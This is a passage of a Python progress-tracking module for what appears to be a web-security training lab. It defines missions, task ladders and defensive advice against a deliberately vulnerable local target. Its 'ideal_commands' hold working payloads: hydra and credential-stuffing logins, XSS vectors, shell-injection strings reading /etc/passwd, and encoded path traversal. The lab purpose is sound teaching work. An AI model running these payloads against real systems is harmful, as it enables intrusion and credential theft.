"""
backend/lab_progress.py — Computes mission progress from target-agent events.

Pulls events from `target-agent:/lab/events?since=...` and matches them
against per-module success criteria. Also includes tool command evidence
from lab mode (AttackBox). Returns a structured response the
LearningPanel renders directly.

Modes:
  tutorial — all evidence counts; rich explanations for each task
  lab      — only approved local tool evidence counts; requires real tool usage
"""
from __future__ import annotations

import os
import time
from typing import Any, Dict, List, Optional

import urllib.request
import urllib.error
import json

# Where to reach the target-agent's evidence API. In docker-compose,
# resolved by service hostname.
TARGET_AGENT_URL = os.getenv("LAB_EVENTS_URL", "http://target-agent")
OPERATOR_TOOL_VIA = {"attackbox", "zap_repeater", "zap_fuzzer"}
BRUTE_FORCE_MIN_FAILURES = 6


def fetch_events(since: float = 0.0,
                 module_id: Optional[str] = None,
                 limit: int = 500) -> List[Dict[str, Any]]:
    """Fetch raw events from target-agent. Returns [] on any error."""
    qs = f"since={since}&limit={limit}"
    if module_id:
        qs += f"&module_id={module_id}"
    url = f"{TARGET_AGENT_URL}/lab/events?{qs}"
    try:
        with urllib.request.urlopen(url, timeout=4) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data.get("events", [])
    except (urllib.error.URLError, urllib.error.HTTPError, ValueError, OSError):
        return []


def _event_extra(e: Dict[str, Any]) -> Dict[str, Any]:
    extra = e.get("extra")
    return extra if isinstance(extra, dict) else {}


def _event_path(e: Dict[str, Any]) -> str:
    return str(e.get("path") or _event_extra(e).get("path") or "")


def _event_backend(e: Dict[str, Any]) -> str:
    extra_backend = _event_extra(e).get("backend")
    if extra_backend:
        return str(extra_backend)
    path = _event_path(e)
    if path.startswith("/op/"):
        return "operator"
    if path.startswith("/auth/"):
        return "guided"
    return ""


def _is_operator_tool_event(e: Dict[str, Any]) -> bool:
    return str(e.get("via") or "") in OPERATOR_TOOL_VIA


# Derived/synthetic events are minted by the target-agent's pattern detector
# rather than by a concrete /op/ route, so they inherit their via + backend from
# the triggering request and have no /op/ path of their own. They are gated on
# backend + tool channel, but exempt from the /op/ path-prefix requirement.
DERIVED_EVENT_TYPES = {"brute_force_pattern", "recon_sequence_observed"}


def _event_counts_for_mode(e: Dict[str, Any], *, is_lab: bool) -> bool:
    """Generalized evidence gate shared by every module EXCEPT brute_force
    (which keeps its dedicated failure-count logic in
    ``_is_brute_force_event_for_mode``).  This is the same operator/guided
    contract the brute-force module proved out, applied uniformly to recon,
    xss, cmd_injection, dir_traversal, file_upload and csrf.

    Lab / Operator mode — an event only counts toward mission progress when it
    was produced by an approved local tool against the operator surface:
      • via ∈ {attackbox, zap_repeater, zap_fuzzer}
      • backend == "operator"
      • path starts with "/op/"  (derived events are exempt — they inherit
        backend/via but carry no /op/ path of their own)
    Browser-only traffic (via=browser) and direct hits (via=unknown) stay
    visible in the evidence panel but never complete the mission.

    Tutorial / Guided mode — counts guided-surface evidence from any channel,
    but NOT operator-surface events, so the two modes never cross-complete.
    """
    backend = _event_backend(e)
    if is_lab:
        if not _is_operator_tool_event(e):
            return False
        if backend != "operator":
            return False
        if e.get("event_type") in DERIVED_EVENT_TYPES:
            return True
        return _event_path(e).startswith("/op/")
    # Tutorial/guided: exclude operator-surface events; any channel is fine.
    return backend != "operator"


def _is_brute_force_event_for_mode(e: Dict[str, Any], *, is_lab: bool) -> bool:
    if e.get("event_type") not in {
        "login_failed", "login_success", "brute_force_pattern", "credential_found",
    }:
        return False
    path = _event_path(e)
    backend = _event_backend(e)
    if is_lab:
        return (
            path == "/op/auth/login"
            and backend == "operator"
            and _is_operator_tool_event(e)
        )
    return path == "/auth/login" and backend != "operator"


def _brute_force_activity(events: List[Dict[str, Any]], *, is_lab: bool) -> Dict[str, Any]:
    scoped = [e for e in events if _is_brute_force_event_for_mode(e, is_lab=is_lab)]
    failures = [e for e in scoped if e.get("event_type") == "login_failed"]
    credentials = [e for e in scoped if e.get("event_type") == "credential_found"]
    paths = sorted({_event_path(e) for e in scoped if _event_path(e)})
    tools = sorted({str(e.get("via")) for e in scoped if str(e.get("via") or "") in OPERATOR_TOOL_VIA})
    return {
        "failed_attempt_count": len(failures),
        "credential_found": bool(credentials),
        "required_failed_attempts": BRUTE_FORCE_MIN_FAILURES,
        "path": "/op/auth/login" if is_lab else "/auth/login",
        "paths_observed": paths,
        "tools_observed": tools,
        "first_failed_at": failures[0].get("ts") if failures else None,
        "credential_found_at": credentials[-1].get("ts") if credentials else None,
    }


# ── Per-module success specs ────────────────────────────────────────────────
# Each module has two task ladders:
#   tasks_tutorial — for tutorial mode (any evidence channel, rich explanations)
#   tasks_lab      — for lab mode (AttackBox/ZAP only, stricter requirements)
#
# success_tutorial / success_lab list event_types that must ALL be observed
# for the mission to be flagged as fully successful.
PROGRESS_SPECS: Dict[str, Dict[str, Any]] = {
    "recon": {
        "tasks_tutorial": [
            {
                "title":  "Visit the target portal",
                "event_types": ["portal_visited"],
                "explain": "Open the target home page in the lab browser.",
            },
            {
                "title":  "Explore at least 3 application areas",
                "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "file_upload_used", "profile_update_used"],
                "min_count": 3,
                "explain": "Click around the portal — visit the search, profile, files, system pages.",
            },
            {
                "title":  "Discover a hidden lab clue",
                "event_types": ["hidden_clue_accessed", "csrf_lure_visited"],
                "explain": "Find a non-obvious route in the app (try /robots.txt or /.well-known/security.txt).",
            },
            {
                "title":  "Trigger recon sequence detection",
                "event_types": ["recon_sequence_observed"],
                "explain": "Visit 4+ distinct areas of the portal to trigger this synthetic event.",
            },
        ],
        "tasks_lab": [
            {
                "title":  "Capture the operator portal",
                "event_types": ["portal_visited"],
                "explain": "Use Browser/ZAP or AttackBox-safe `curl -i http://target-agent/op/` to capture the local /op/ portal.",
            },
            {
                "title":  "Map at least 4 /op/ endpoints with approved tools",
                "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "file_upload_used", "profile_update_used"],
                "min_count": 4,
                "explain": "Use ZAP Repeater/Fuzzer or validator-safe AttackBox requests. Browser clicks help capture traffic, but approved tools complete Operator Mode.",
            },
            {
                "title":  "Discover the hidden lab clue",
                "event_types": ["hidden_clue_accessed", "csrf_lure_visited"],
                "explain": "Replay local discovery paths in ZAP Repeater or validator-safe curl, then compare 200/404 responses carefully.",
            },
            {
                "title":  "Trigger recon sequence detection",
                "event_types": ["recon_sequence_observed"],
                "explain": "After 4+ distinct /op/ areas are observed via approved local tools, this synthetic event fires.",
            },
        ],
        "success_tutorial": ["portal_visited", "recon_sequence_observed"],
        "success_lab":      ["recon_sequence_observed"],
        "defensive_insight":
            "Hide internal route maps from public landing pages. Keep server "
            "version banners out of HTML comments and response headers.",
    },

    "brute_force": {
        "tasks_tutorial": [
            {
                "title": "Use the login form at /auth/login",
                "event_types": ["login_failed", "login_success"],
                "explain": "Submit the login form to interact with the vulnerable endpoint.",
            },
            {
                "title": "Make at least 6 failed login attempts",
                "event_types": ["login_failed"],
                "min_count": BRUTE_FORCE_MIN_FAILURES,
                "explain": "Use the guided login form enough times to create a realistic failed-attempt pattern.",
            },
            {
                "title": "Find a valid credential",
                "event_types": ["credential_found"],
                "explain": "Successfully log in to confirm a working username/password pair.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Probe the login endpoint with Repeater or safe curl",
                "event_types": ["login_failed", "login_success"],
                "min_count": 1,
                "explain": "Capture POST /op/auth/login in ZAP and send one baseline request through Repeater or a validator-safe AttackBox command.",
            },
            {
                "title": "Run a wordlist attack through approved local tools",
                "event_types": ["login_failed"],
                "min_count": 6,
                "explain": "Drive 6+ login attempts via ZAP Fuzzer, Repeater, or validator-safe AttackBox tooling. Browser clicks do NOT count.",
            },
            {
                "title": "Trigger the brute-force pattern detection",
                "event_types": ["brute_force_pattern"],
                "explain": "After repeated local-tool failures, the pattern event fires.",
            },
            {
                "title": "Confirm a valid credential by hand",
                "event_types": ["credential_found"],
                "explain": "Use the credential found by the local tool run in Repeater or AttackBox and confirm a 302 redirect to /profile/.",
            },
        ],
        "success_tutorial": ["login_failed", "credential_found"],
        "success_lab":      ["login_failed", "credential_found"],
        "defensive_insight":
            "Add per-account and per-IP rate limiting, account lockout after "
            "5 failures, and detection rules for repeated 401 responses.",
    },

    "xss": {
        "tasks_tutorial": [
            {
                "title": "Use the search form",
                "event_types": ["search_used"],
                "explain": "Submit any query to interact with the reflective endpoint.",
            },
            {
                "title": "Submit a script-like payload",
                "event_types": ["xss_payload_observed"],
                "explain": "Try things like <script>alert(1)</script> or onerror= handlers.",
            },
            {
                "title": "Confirm reflection without escaping",
                "event_types": ["reflected_input_detected"],
                "explain": "When XSS-shaped input is reflected unescaped, this fires.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Capture the search endpoint in ZAP",
                "event_types": ["search_used"],
                "min_count": 1,
                "explain": "Open /op/search, capture GET /op/search?q=..., and inspect where the marker appears in the response.",
            },
            {
                "title": "Submit at least 2 XSS-shaped payloads",
                "event_types": ["xss_payload_observed"],
                "min_count": 2,
                "explain": "Use ZAP Repeater/Fuzzer for proof payloads. They are HTTP parameter values, not AttackBox shell commands.",
            },
            {
                "title": "Confirm unescaped reflection",
                "event_types": ["reflected_input_detected"],
                "explain": "Verify the proof payload is reflected unescaped in the Repeater/Fuzzer response body.",
            },
        ],
        "success_tutorial": ["xss_payload_observed", "reflected_input_detected"],
        "success_lab":      ["xss_payload_observed", "reflected_input_detected"],
        "defensive_insight":
            "Encode untrusted output before rendering it into HTML. Use a "
            "templating engine with autoescape ON. Add a CSP that blocks inline scripts.",
    },

    "cmd_injection": {
        "tasks_tutorial": [
            {
                "title": "Use the diagnostics ping form",
                "event_types": ["diagnostics_used"],
                "explain": "Submit a host value to /system/ping.",
            },
            {
                "title": "Submit shell separator characters",
                "event_types": ["command_separator_observed"],
                "explain": "Try host values like 127.0.0.1; id  or  127.0.0.1 && whoami.",
            },
            {
                "title": "Confirm command injection",
                "event_types": ["command_injection_detected"],
                "explain": "Output that includes uid=, root:, or /bin/* indicators.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Capture the ping endpoint in ZAP",
                "event_types": ["diagnostics_used"],
                "min_count": 1,
                "explain": "Open /op/system/ping with a normal host and send the captured request to Repeater for a clean baseline.",
            },
            {
                "title": "Test 2+ shell metacharacters in ZAP",
                "event_types": ["command_separator_observed"],
                "min_count": 2,
                "explain": "Use ZAP Repeater/Fuzzer for separator payloads. AttackBox intentionally blocks shell-control syntax.",
            },
            {
                "title": "Confirm command-injection proof output",
                "event_types": ["command_injection_detected"],
                "explain": "Use harmless local proof output via Repeater/Fuzzer. Do not use reverse shells, callbacks, deletion, or persistence.",
            },
        ],
        "success_tutorial": ["command_injection_detected"],
        "success_lab":      ["command_injection_detected"],
        "defensive_insight":
            "Never pass user input to shell commands. Use parameterized "
            "system calls (subprocess with a list and shell=False) or a strict "
            "allowlist of legal hostnames.",
    },

    "dir_traversal": {
        "tasks_tutorial": [
            {
                "title": "Use the file viewer",
                "event_types": ["file_viewer_used"],
                "explain": "Open /files/read?path=readme.txt.",
            },
            {
                "title": "Submit a path-traversal sequence",
                "event_types": ["traversal_pattern_observed"],
                "explain": "Try ../../etc/passwd in the path field.",
            },
            {
                "title": "Disclose a sensitive file",
                "event_types": ["sensitive_file_disclosed"],
                "explain": "When response content includes root:, /bin/, etc.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Capture the file viewer in ZAP",
                "event_types": ["file_viewer_used"],
                "min_count": 1,
                "explain": "Open /op/files/read?path=readme.txt, capture the request, and send it to Repeater before changing the path parameter.",
            },
            {
                "title": "Test 2+ path variants in ZAP",
                "event_types": ["traversal_pattern_observed"],
                "min_count": 2,
                "explain": "Use Repeater/Fuzzer to compare an allowed file, a rejected traversal pattern, and a local lab disclosure candidate.",
            },
            {
                "title": "Confirm safe lab file disclosure",
                "event_types": ["sensitive_file_disclosed"],
                "explain": "Confirm a local lab file disclosure via approved ZAP tooling. Do not target external or host files.",
            },
        ],
        "success_tutorial": ["sensitive_file_disclosed"],
        "success_lab":      ["sensitive_file_disclosed"],
        "defensive_insight":
            "Normalize paths with os.path.realpath and verify the resolved "
            "path stays inside the intended base directory before opening.",
    },

    "file_upload": {
        "tasks_tutorial": [
            {
                "title": "Use the upload form",
                "event_types": ["file_upload_used"],
                "explain": "Submit any file via /files/upload.",
            },
            {
                "title": "Successfully save a file",
                "event_types": ["file_saved"],
                "explain": "An uploaded file lands in /app/static/uploads/.",
            },
            {
                "title": "Upload a dangerous file extension",
                "event_types": ["dangerous_extension_accepted", "unrestricted_upload_detected"],
                "explain": "Upload a .php / .jsp / .sh / .html file — it is accepted.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Capture the upload endpoint in ZAP",
                "event_types": ["file_upload_used"],
                "min_count": 1,
                "explain": "Upload a harmless file in the browser and inspect the multipart POST /op/files/upload in ZAP.",
            },
            {
                "title": "Replay safe multipart uploads",
                "event_types": ["file_saved"],
                "min_count": 2,
                "explain": "Use Repeater to replay or safely edit captured multipart uploads with harmless content.",
            },
            {
                "title": "Demonstrate unsafe upload validation",
                "event_types": ["dangerous_extension_accepted", "unrestricted_upload_detected"],
                "explain": "Use ZAP Repeater/Fuzzer to edit filename or content type with harmless proof content. Do not create or upload a web shell.",
            },
        ],
        "success_tutorial": ["unrestricted_upload_detected"],
        "success_lab":      ["unrestricted_upload_detected"],
        "defensive_insight":
            "Validate by file content (magic bytes), enforce an allowlist of "
            "extensions, and never serve uploads from a path that gets executed "
            "by the application server.",
    },

    "csrf": {
        "tasks_tutorial": [
            {
                "title": "Visit the profile page",
                "event_types": ["profile_update_used", "route_discovered"],
                "explain": "Open /profile/ to see a state-changing form.",
            },
            {
                "title": "Open the CSRF demo lure page",
                "event_types": ["csrf_lure_visited"],
                "explain": "Visit /evil/csrf-demo while logged in.",
            },
            {
                "title": "Submit forged update without a token",
                "event_types": [
                    "csrf_lure_submitted",
                    "profile_changed_without_csrf",
                    "csrf_token_missing",
                ],
                "explain": "Click the lure button — the profile email changes silently.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Open the profile page in the browser",
                "event_types": ["profile_update_used"],
                "min_count": 1,
                "explain": "Use the Operator browser and ZAP capture flow for profile state changes; this module is not terminal-command based.",
            },
            {
                "title": "Inspect the profile-update request",
                "event_types": ["profile_update_used"],
                "min_count": 1,
                "explain": "Inspect POST /op/profile/update in ZAP and check whether a CSRF token exists in the form, body, or headers.",
            },
            {
                "title": "Submit the local CSRF lure",
                "event_types": [
                    "csrf_token_missing",
                    "profile_changed_without_csrf",
                ],
                "explain": "Use the local /op/evil/csrf-demo lure and confirm the profile changed without a token. Do not use external exploit servers.",
            },
        ],
        "success_tutorial": ["profile_changed_without_csrf"],
        "success_lab":      ["profile_changed_without_csrf"],
        "defensive_insight":
            "Require a CSRF token on every state-changing form, validate the "
            "Origin/Referer header, and use SameSite=Strict cookies.",
    },
}


# ═══════════════════════════════════════════════════════════════════════════
#  MODULE VARIANTS — Each module supports multiple attack flavours.
#  The learner picks one when starting a mission.  At progress-compute time
#  the variant's task ladder REPLACES the default tasks_tutorial / tasks_lab
#  for that module, and the variant-specific success markers REPLACE the
#  default ones.  The rest of the spec (defensive_insight etc.) is reused.
#
#  Each variant entry:
#    name         — human-readable name shown in the variant picker
#    description  — 1-2 sentences shown under the radio button
#    difficulty   — "Easy" | "Medium" | "Hard"
#    techniques   — short list of techniques used (informational)
#    tasks        — list of task dicts (same shape as PROGRESS_SPECS.tasks_lab)
#    success_event_types — events that must ALL fire for success
#    ideal_commands — list of literal commands the operator should run
#                     (used by the Report agent for "ideal approach" coaching)
# ═══════════════════════════════════════════════════════════════════════════
MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {

    # ─── BRUTE FORCE ────────────────────────────────────────────────────
    "brute_force": {
        "password_spray": {
            "name":        "Password Spraying",
            "description": "Try ONE common password across MANY usernames. Evades per-account lockout.",
            "difficulty":  "Easy",
            "techniques":  ["enumeration", "low-and-slow", "single-password"],
            "tasks": [
                {"title": "Enumerate likely usernames",
                 "event_types": ["login_failed", "login_success"],
                 "min_count": 4,
                 "explain":     "Submit at least 4 different usernames with the same trial password."},
                {"title": "Detect username enumeration leak",
                 "event_types": ["login_failed"],
                 "min_count": 6,
                 "explain":     "Send at least 6 failed logins, comparing the error message between "
                                "known and unknown users — the wording leaks which accounts exist."},
                {"title": "Trigger pattern detection",
                 "event_types": ["brute_force_pattern"],
                 "explain":     "Make 3+ failed login attempts from your client — the brute-force "
                                "pattern event fires automatically once the threshold is crossed."},
                {"title": "Discover a working credential",
                 "event_types": ["credential_found"],
                 "explain":     "Keep spraying — one candidate username shares the spray password. "
                                "Completing the mission needs BOTH the pattern (volume) AND a valid login, "
                                "so don't stop at the first success: a real spray is noisy by design."},
            ],
            "success_event_types": ["brute_force_pattern", "credential_found"],
            "ideal_commands": [
                "# ── Password spraying · ZAP Fuzzer (Lab Tools → ZAP → Fuzzer) ──",
                "# Sniper attack: ONE common password, MANY usernames.",
                "# 1. POSITIONS →  username=§&password=password123   (§ on the username)",
                "# 2. PAYLOADS  →  preset 'Common usernames'  →  START ATTACK",
                "# 3. RESULTS   →  sort by STATUS. The 302 row is the account that",
                "#                 reuses this common password (here: admin).",
                "# 4. CONFIRM   →  Repeater: username=admin&password=password123 → 302 /profile/.",
                "# Optional terminal fallback (only if you prefer the CLI):",
                "curl -i -X POST http://target-agent/auth/login -d 'username=admin&password=password123'",
            ],
        },
        "credential_stuffing": {
            "name":        "Credential Stuffing",
            "description": "Reuse leaked password lists against known accounts. Tests password reuse.",
            "difficulty":  "Medium",
            "techniques":  ["leaked-wordlist", "multi-password", "known-username"],
            "tasks": [
                {"title": "Confirm endpoint accepts repeated POSTs",
                 "event_types": ["login_failed"],
                 "min_count": 1,
                 "explain":     "Send one POST to /auth/login to verify the form."},
                {"title": "Stuff a known username with a leaked wordlist",
                 "event_types": ["login_failed"],
                 "min_count": 8,
                 "explain":     "Loop 8+ leaked passwords against username 'admin'."},
                {"title": "Trigger brute-force pattern detection",
                 "event_types": ["brute_force_pattern"],
                 "explain":     "Wazuh-style detection fires after 3+ failures in 5 min."},
                {"title": "Credential found in the leaked list",
                 "event_types": ["credential_found"],
                 "explain":     "The lab passwords contain the planted credential."},
            ],
            "success_event_types": ["brute_force_pattern", "credential_found"],
            "ideal_commands": [
                "# ── Two-phase attack · ZAP Fuzzer — the PortSwigger method ──",
                "#   (Lab Tools → ZAP → Fuzzer.  Attack type: Sniper.)",
                "#",
                "# PHASE 1 — enumerate a valid USERNAME (Sniper on the username):",
                "#   Click '① Enumerate username'   →  username=§&password=x",
                "#   PAYLOADS: 'Common usernames'   →  START ATTACK",
                "#   GREP-MATCH is auto-set to 'Incorrect password'. Every row is 401,",
                "#   but valid users return that message (invalid users say 'Account",
                "#   not found'). The ✓ rows in the MATCH column are real accounts → admin.",
                "#",
                "# PHASE 2 — brute that user's PASSWORD (Sniper on the password):",
                "#   Click '② Brute password'       →  username=admin&password=§",
                "#   PAYLOADS: 'Leaked mini-list'   →  START ATTACK",
                "#   Read the STATUS column: the 302 row is the password → password123.",
                "#",
                "# CONFIRM — Repeater: username=admin&password=password123 → 302 /profile/.",
                "# Optional terminal fallback (only if you prefer the CLI):",
                "curl -i -X POST http://target-agent/auth/login -d 'username=admin&password=password123'",
            ],
        },
        "hydra_targeted": {
            "name":        "Targeted Hydra Attack",
            "description": "Form-aware brute force using hydra with a curated wordlist. Hardest technique. "
                           "(Lab note: this target has no rate-limit/lockout, so the simpler variants also succeed — "
                           "do this one to practise real tooling you'd need against a defended login.)",
            "difficulty":  "Hard",
            "techniques":  ["hydra", "form-template", "parallel-threads"],
            "tasks": [
                {"title": "Inspect the login form structure",
                 "event_types": ["login_failed"],
                 "min_count": 1,
                 "explain":     "GET /auth/login and identify the action URL + field names."},
                {"title": "Build a smart wordlist matched to the company",
                 "event_types": ["login_failed"],
                 "min_count": 10,
                 "explain":     "Hydra will probe 10+ password candidates against multiple users."},
                {"title": "Trigger brute-force pattern detection",
                 "event_types": ["brute_force_pattern"],
                 "explain":     "Mass parallel attempts trip the pattern detector instantly."},
                {"title": "Hydra reports a valid credential",
                 "event_types": ["credential_found"],
                 "explain":     "Hydra's -f flag stops on first hit and prints user:pass."},
            ],
            "success_event_types": ["brute_force_pattern", "credential_found"],
            "ideal_commands": [
                "# Advanced track — real CLI tooling. For the GUI-only path, use the",
                "# ZAP Fuzzer instead (Password Spraying / Credential Stuffing variants).",
                "# Hydra form-template: path:body:failure-string",
                "hydra -l admin -P /wordlists/rockyou-mini.txt target-agent http-post-form '/auth/login:username=^USER^&password=^PASS^:Incorrect password' -t 8 -f",
                "# Verify the credential by hand",
                "curl -i -X POST http://target-agent/auth/login \\",
                "     -d 'username=admin&password=password123'   # → 302 /profile/",
            ],
        },
    },

    # ─── XSS ────────────────────────────────────────────────────────────
    "xss": {
        "reflected": {
            "name":        "Reflected XSS",
            "description": "Single-request injection — payload bounces back in the response.",
            "difficulty":  "Easy",
            "techniques":  ["reflection", "script-tag", "url-parameter"],
            "tasks": [
                {"title": "Submit a benign query to confirm reflection",
                 "event_types": ["search_used"], "min_count": 1,
                 "explain": "GET /search?q=hello — confirm 'hello' appears in the response body."},
                {"title": "Inject a script-style payload",
                 "event_types": ["xss_payload_observed"], "min_count": 1,
                 "explain": "Try <script>alert(1)</script>"},
                {"title": "Confirm the payload renders unescaped",
                 "event_types": ["reflected_input_detected"],
                 "explain": "The response includes the raw script tag — verbatim."},
            ],
            "success_event_types": ["xss_payload_observed", "reflected_input_detected"],
            "ideal_commands": [
                "curl -s --data-urlencode 'q=<script>alert(1)</script>' -G \\",
                "     http://target-agent/search | grep -oE '<script[^<]*</script>'",
                "# Expected:  <script>alert(1)</script>  (verbatim = unescaped)",
            ],
        },
        "alternate_context": {
            "name":        "Alternate XSS Contexts",
            "description": "Bypass script-tag blocklists with event handlers and SVG/IMG vectors.",
            "difficulty":  "Medium",
            "techniques":  ["event-handler", "svg-onload", "img-onerror"],
            "tasks": [
                {"title": "Confirm baseline reflection",
                 "event_types": ["search_used"], "min_count": 1,
                 "explain": "GET /search?q=test"},
                {"title": "Submit 3 distinct payload contexts",
                 "event_types": ["xss_payload_observed"], "min_count": 3,
                 "explain": "<img onerror>, <svg onload>, javascript: URL — each is a different filter bypass."},
                {"title": "Confirm at least one unescaped reflection",
                 "event_types": ["reflected_input_detected"],
                 "explain": "If <script> is filtered, event handlers often slip through."},
            ],
            "success_event_types": ["xss_payload_observed", "reflected_input_detected"],
            "ideal_commands": [
                "for payload in '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>' '\"><script>alert(1)</script>'; do",
                "  echo \"=== $payload ===\"",
                "  curl -s -G --data-urlencode \"q=$payload\" http://target-agent/search | grep -oE '<(img|svg|script)[^>]*>'",
                "done",
            ],
        },
        "stored_attempt": {
            "name":        "Stored XSS Probe",
            "description": "Save a payload via the profile bio field — see if it persists. Hardest technique. "
                           "(Lab note: the reflected variant already succeeds here; do this one to learn stored/persistent "
                           "XSS, which is what matters on apps that filter reflected input.)",
            "difficulty":  "Hard",
            "techniques":  ["persistence", "profile-update", "double-trigger"],
            "tasks": [
                {"title": "Authenticate so the profile is editable",
                 "event_types": ["login_success"], "min_count": 1,
                 "explain": "POST /auth/login with valid credentials."},
                {"title": "Submit a payload through the profile bio",
                 "event_types": ["xss_payload_observed", "profile_update_used"], "min_count": 2,
                 "explain": "POST /profile/update with email or bio containing a script tag."},
                {"title": "Verify the payload reflects on a SECOND request",
                 "event_types": ["reflected_input_detected"],
                 "explain": "Reload /profile/ and confirm the payload is still there."},
            ],
            "success_event_types": ["xss_payload_observed", "reflected_input_detected"],
            "ideal_commands": [
                "# 1. Login and save cookie",
                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login \\",
                "     -d 'username=admin&password=password123' >/dev/null",
                "# 2. Update profile email with a payload",
                "curl -b /tmp/c.txt -s -X POST http://target-agent/profile/update \\",
                "     --data-urlencode 'email=<script>alert(1)</script>@evil.lab'",
                "# 3. Re-read profile — payload appears unescaped",
                "curl -b /tmp/c.txt -s http://target-agent/profile/ | grep -oE '<script[^<]*</script>'",
            ],
        },
    },

    # ─── COMMAND INJECTION ──────────────────────────────────────────────
    "cmd_injection": {
        "semicolon_basic": {
            "name":        "Semicolon Chaining",
            "description": "Classic shell-injection: append a second command with ;.",
            "difficulty":  "Easy",
            "techniques":  ["semicolon", "command-chaining"],
            "tasks": [
                {"title": "Confirm the ping endpoint works",
                 "event_types": ["diagnostics_used"], "min_count": 1,
                 "explain": "GET /system/ping?host=127.0.0.1"},
                {"title": "Submit a semicolon-chained payload",
                 "event_types": ["command_separator_observed"], "min_count": 1,
                 "explain": "host=127.0.0.1; id"},
                {"title": "Confirm the injected command ran",
                 "event_types": ["command_injection_detected"],
                 "explain": "Output contains 'uid=' or '/etc/' indicators."},
            ],
            "success_event_types": ["command_injection_detected"],
            "ideal_commands": [
                "curl -s -G --data-urlencode 'host=127.0.0.1; id' \\",
                "     http://target-agent/system/ping | grep -oE 'uid=[^ ]+'",
                "# Expected:  uid=0(root)",
            ],
        },
        "pipe_redirect": {
            "name":        "Pipe & Redirect",
            "description": "Bypass semicolon filters using | and > characters.",
            "difficulty":  "Medium",
            "techniques":  ["pipe", "redirect", "filter-bypass"],
            "tasks": [
                {"title": "Probe the endpoint",
                 "event_types": ["diagnostics_used"], "min_count": 1,
                 "explain": "GET /system/ping?host=127.0.0.1"},
                {"title": "Test 2+ alternative separators",
                 "event_types": ["command_separator_observed"], "min_count": 2,
                 "explain": "Try host=127.0.0.1|whoami, host=127.0.0.1>/tmp/out.txt"},
                {"title": "Confirm RCE through pipe",
                 "event_types": ["command_injection_detected"],
                 "explain": "Pipe output reveals system info."},
            ],
            "success_event_types": ["command_injection_detected"],
            "ideal_commands": [
                "curl -s -G --data-urlencode 'host=127.0.0.1|whoami' http://target-agent/system/ping",
                "curl -s -G --data-urlencode 'host=127.0.0.1 && cat /etc/hostname' http://target-agent/system/ping",
            ],
        },
        "subshell": {
            "name":        "Subshell Substitution",
            "description": "Use $() or backticks to inject output. Stealthy — no obvious separator. Hardest technique. "
                           "(Lab note: the semicolon variant already works here; do this one to learn a bypass that "
                           "survives filters which only block ; and |.)",
            "difficulty":  "Hard",
            "techniques":  ["subshell", "backtick", "dollar-paren"],
            "tasks": [
                {"title": "Confirm baseline",
                 "event_types": ["diagnostics_used"], "min_count": 1,
                 "explain": "GET /system/ping?host=127.0.0.1"},
                {"title": "Inject via $(...) or `...`",
                 "event_types": ["command_separator_observed"], "min_count": 2,
                 "explain": "host=$(id), host=`whoami`"},
                {"title": "Confirm subshell output reached you",
                 "event_types": ["command_injection_detected"],
                 "explain": "Response shows command output substituted into ping target."},
            ],
            "success_event_types": ["command_injection_detected"],
            "ideal_commands": [
                "curl -s -G --data-urlencode 'host=$(id)' http://target-agent/system/ping | head -5",
                "curl -s -G --data-urlencode 'host=`cat /etc/passwd | head -1`' http://target-agent/system/ping",
            ],
        },
    },

    # ─── DIR TRAVERSAL ──────────────────────────────────────────────────
    "dir_traversal": {
        "plain": {
            "name":        "Plain ../",
            "description": "Vanilla path traversal — no encoding, no tricks.",
            "difficulty":  "Easy",
            "techniques":  ["dotdotslash", "relative-path"],
            "tasks": [
                {"title": "Probe the file viewer",
                 "event_types": ["file_viewer_used"], "min_count": 1,
                 "explain": "GET /files/read?path=readme.txt"},
                {"title": "Submit a traversal sequence",
                 "event_types": ["traversal_pattern_observed"], "min_count": 1,
                 "explain": "path=../../etc/passwd"},
                {"title": "Read a sensitive system file",
                 "event_types": ["sensitive_file_disclosed"],
                 "explain": "Response contains 'root:' or '/bin/bash'."},
            ],
            "success_event_types": ["sensitive_file_disclosed"],
            "ideal_commands": [
                "curl -s 'http://target-agent/files/read?path=../../etc/passwd' | grep -E '^root:'",
            ],
        },
        "encoded": {
            "name":        "URL-Encoded Traversal",
            "description": "Bypass simple string filters with %2e and %2f.",
            "difficulty":  "Medium",
            "techniques":  ["url-encoding", "filter-bypass"],
            "tasks": [
                {"title": "Probe the viewer",
                 "event_types": ["file_viewer_used"], "min_count": 1,
                 "explain": "GET /files/read?path=readme.txt"},
                {"title": "Submit 2+ encoded traversal variants",
                 "event_types": ["traversal_pattern_observed"], "min_count": 2,
                 "explain": "%2e%2e%2fetc%2fpasswd, also try %252e%252e for double-encoding."},
                {"title": "Disclose a sensitive file",
                 "event_types": ["sensitive_file_disclosed"],
                 "explain": "Response includes /etc/passwd content."},
            ],
            "success_event_types": ["sensitive_file_disclosed"],
            "ideal_commands": [
                "curl -s 'http://target-agent/files/read?path=..%2F..%2Fetc%2Fpasswd' | head",
                "curl -s 'http://target-agent/files/read?path=%252E%252E%252Fetc%252Fpasswd' | head",
            ],
        },
        "absolute": {
            "name":        "Absolute Path",
            "description": "Skip the traversal — just send /etc/passwd directly. Hardest technique. "
                           "(Lab note: plain ../ already works here; do this one to learn the bypass for apps that "
                           "strip ../ sequences but forget to block absolute paths.)",
            "difficulty":  "Hard",
            "techniques":  ["absolute-path", "null-byte"],
            "tasks": [
                {"title": "Probe the viewer",
                 "event_types": ["file_viewer_used"], "min_count": 1,
                 "explain": "GET /files/read?path=readme.txt"},
                {"title": "Submit an absolute path",
                 "event_types": ["traversal_pattern_observed"], "min_count": 1,
                 "explain": "path=/etc/passwd (no dot-dot)."},
                {"title": "Disclose sensitive file via absolute path",
                 "event_types": ["sensitive_file_disclosed"],
                 "explain": "Some apps strip ../ but accept absolute paths."},
            ],
            "success_event_types": ["sensitive_file_disclosed"],
            "ideal_commands": [
                "curl -s 'http://target-agent/files/read?path=/etc/passwd' | grep -E '^root:'",
                "curl -s 'http://target-agent/files/read?path=/etc/hostname'",
            ],
        },
    },

